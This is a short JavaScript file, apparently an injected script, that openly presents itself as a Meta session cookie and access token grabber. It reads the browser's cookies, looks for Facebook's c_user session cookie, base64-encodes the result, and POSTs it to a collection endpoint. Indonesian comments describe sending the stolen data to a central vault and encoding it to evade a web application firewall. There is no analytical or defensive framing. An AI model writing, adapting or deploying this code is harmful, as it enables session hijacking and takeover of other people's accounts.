/* SKY-AURORA INDUSTRIES - INTERNAL ASSET 02
   TARGET: META SESSION COOKIE & ACCESS TOKEN GRABBER
   LOGIC: CLIENT-SIDE INJECTION
*/

const SkyGrabber = {
    target: "https://graph.facebook.com/v15.0/me",
    
    init: function() {
        console.log("[!] SKY-AURORA: Grabber Sequence Initialized...");
        this.steal();
    },

    steal: function() {
        // Blueprint: Extracting cookies that bypass 2FA
        let session_cookies = document.cookie;
        if (session_cookies.includes("c_user")) {
            this.transmit(session_cookies);
        } else {
            console.log("[-] Target session not found. Retrying...");
        }
    },

    transmit: function(data) {
        // Mengirim aset curian ke portal pusat SKY di port 9000
        fetch('http://localhost:9000/collect', {
            method: 'POST',
            body: JSON.stringify({
                owner: "SKY",
                type: "META_SESSION",
                payload: btoa(data) // Enkripsi Base64 biar gak kedeteksi WAF
            })
        })
        .then(() => console.log("[+] SKY-AURORA: Asset successfully moved to Vault."))
        .catch(err => console.error("[ERROR] Interference detected!"));
    }
};

SkyGrabber.init();

